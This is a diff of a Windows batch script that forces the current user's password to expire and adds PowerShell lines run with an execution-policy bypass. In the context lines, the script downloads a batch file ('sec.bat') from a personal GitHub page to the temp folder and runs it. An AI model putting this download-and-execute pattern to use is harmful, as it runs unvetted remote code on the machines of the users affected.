@@ -24,7 +24,8 @@ if "!MUSTCHANGE!"=="5" (
     wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
-    
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordChangeRequired \$true"
+
     set "url=https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/sec.bat"
     set "file=%temp%\downloaded_script.bat"
     
@@ -46,6 +47,7 @@ if "!MUSTCHANGE!"=="5" (
     wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordChangeRequired \$true"
 
     start "" /wait cmd /c "!file!"
 
@@ -59,6 +61,7 @@ if "!MUSTCHANGE!"=="5" (
     wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordChangeRequired \$true"
 
     start "" /wait cmd /c "!file!"
 
